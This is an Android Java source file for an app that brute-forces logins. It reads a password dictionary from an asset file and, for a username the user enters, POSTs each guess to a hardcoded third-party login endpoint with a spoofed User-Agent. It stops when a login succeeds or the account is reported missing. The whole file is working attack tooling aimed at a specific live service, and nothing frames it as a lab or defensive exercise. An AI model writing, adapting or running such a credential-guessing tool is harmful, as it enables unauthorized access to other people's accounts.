package cn.qg.hk;

import androidx.appcompat.app.AppCompatActivity;
import android.graphics.Color;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.text.SpannableString;
import android.text.Spanned;
import android.text.style.ForegroundColorSpan;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends AppCompatActivity {

    // UI组件
    private EditText usernameInput;
    private Button startButton;
    private TextView outputText;
    private ProgressBar progressBar;
    private ScrollView scrollView;

    // 密码列表和状态
    private List<String> passwords = new ArrayList<>();
    private int totalPasswords = 0;
    private boolean isRunning = false;

    // 线程管理
    private ExecutorService executorService;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());
    private final OkHttpClient client = new OkHttpClient();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 初始化UI组件
        usernameInput = findViewById(R.id.usernameInput);
        startButton = findViewById(R.id.startButton);
        outputText = findViewById(R.id.outputText);
        progressBar = findViewById(R.id.progressBar);
        scrollView = findViewById(R.id.scrollView);

        // 加载密码字典
        loadPasswords();

        // 设置开始按钮点击事件
        startButton.setOnClickListener(v -> startBruteForce());
    }

    // 加载密码字典
    private void loadPasswords() {
        new Thread(() -> {
            try {
                InputStream is = getAssets().open("pass.txt");
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    passwords.add(line.trim());
                }
                totalPasswords = passwords.size();
                reader.close();

                uiHandler.post(() -> {
                    if (totalPasswords > 0) {
                        Toast.makeText(MainActivity.this,
                                "密码字典加载完成 (" + totalPasswords + " 个密码)",
                                Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(MainActivity.this,
                                "密码字典为空",
                                Toast.LENGTH_SHORT).show();
                    }
                });
            } catch (IOException e) {
                uiHandler.post(() -> {
                    Toast.makeText(MainActivity.this,
                            "错误: 无法加载密码字典",
                            Toast.LENGTH_SHORT).show();
                });
                e.printStackTrace();
            }
        }).start();
    }

    // 开始爆破
    private void startBruteForce() {
        String username = usernameInput.getText().toString().trim();
        if (username.isEmpty()) {
            Toast.makeText(this, "错误: 请输入用户名", Toast.LENGTH_SHORT).show();
            return;
        }

        if (passwords.isEmpty()) {
            Toast.makeText(this, "错误: 密码字典为空", Toast.LENGTH_SHORT).show();
            return;
        }

        // 重置状态
        isRunning = true;
        outputText.setText("");
        startButton.setEnabled(false);
        progressBar.setVisibility(View.VISIBLE);
        progressBar.setMax(totalPasswords);
        progressBar.setProgress(0);

        // 创建线程池
        if (executorService != null) {
            executorService.shutdownNow();
        }
        executorService = Executors.newFixedThreadPool(1);

        // 开始爆破任务
        executorService.execute(() -> {
            for (int i = 0; i < totalPasswords && isRunning; i++) {
                String password = passwords.get(i);
                final int currentIndex = i;

                // 执行请求
                try {
                    String response = attemptLogin(username, password);

                    // 解析响应
                    JSONObject json = new JSONObject(response);
                    String code = json.optString("code", "");
                    String msg = json.optString("msg", "");

                    boolean success = "登录成功".equals(code);
                    boolean accountNotExist = "账号不存在".equals(msg);

                    // 更新输出
                    uiHandler.post(() -> {
                        progressBar.setProgress(currentIndex + 1);

                        appendOutput(String.format("[%d/%d] pass:%s", currentIndex+1, totalPasswords, password),
                                success);
                        appendOutput(formatResponse(json), success);
                        appendOutput("", false); // 空行

                        // 如果成功或账号不存在，停止尝试
                        if (success || accountNotExist) {
                            String message = success ? "成功找到密码!" : "账号不存在，停止爆破";
                            Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show();
                            stopBruteForce();
                        }
                    });

                    // 如果成功或账号不存在，跳出循环
                    if (success || accountNotExist) {
                        break;
                    }

                    // 延迟
                    Thread.sleep(100);
                } catch (Exception e) {
                    uiHandler.post(() -> {
                        progressBar.setProgress(currentIndex + 1);

                        appendOutput(String.format("[%d/%d] pass:%s", currentIndex+1, totalPasswords, password),
                                false);
                        appendOutput("请求失败: " + e.getMessage(), false);
                        appendOutput("", false); // 空行
                    });
                }
            }

            if (isRunning) {
                uiHandler.post(() -> {
                    Toast.makeText(MainActivity.this,
                            "所有密码尝试完成",
                            Toast.LENGTH_SHORT).show();
                    stopBruteForce();
                });
            }
        });
    }

    // 尝试登录
    private String attemptLogin(String username, String password) throws IOException {
        RequestBody formBody = new FormBody.Builder()
                .add("user", username)
                .add("pass", password)
                .build();

        Request request = new Request.Builder()
                .url("http://qght.ainiya.xyz/dl.php")
                .post(formBody)
                .addHeader("User-Agent", "Apache-HttpClient/UNAVAILABLE (java 1.4)")
                .addHeader("Connection", "Keep-Alive")
                .addHeader("Accept-Encoding", "identity")
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (response.isSuccessful() && response.body() != null) {
                return response.body().string();
            } else {
                throw new IOException("HTTP " + response.code());
            }
        }
    }

    // 格式化响应 - 使用JSONObject直接处理
    private String formatResponse(JSONObject json) {
        StringBuilder formatted = new StringBuilder();

        try {
            Iterator<String> keys = json.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                Object value = json.get(key);
                formatted.append("\"").append(key).append("\": \"")
                        .append(value.toString()).append("\"\n");
            }
        } catch (JSONException e) {
            // 如果解析出错，返回原始JSON字符串
            return json.toString().replace("{", "").replace("}", "").replace(",", "\n");
        }

        return formatted.toString().trim();
    }

    // 添加输出
    private void appendOutput(String text, boolean isSuccess) {
        int color = isSuccess ? Color.GREEN : Color.RED;

        SpannableString spannable = new SpannableString(text + "\n");
        spannable.setSpan(
                new ForegroundColorSpan(color),
                0,
                text.length(),
                Spanned.SPAN_EXCLUSIVE_EXCLUSIVE
        );
        outputText.append(spannable);

        // 自动滚动到底部
        scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
    }

    // 停止爆破
    private void stopBruteForce() {
        isRunning = false;
        startButton.setEnabled(true);
        progressBar.setVisibility(View.INVISIBLE);

        if (executorService != null) {
            executorService.shutdownNow();
            executorService = null;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopBruteForce();
    }
}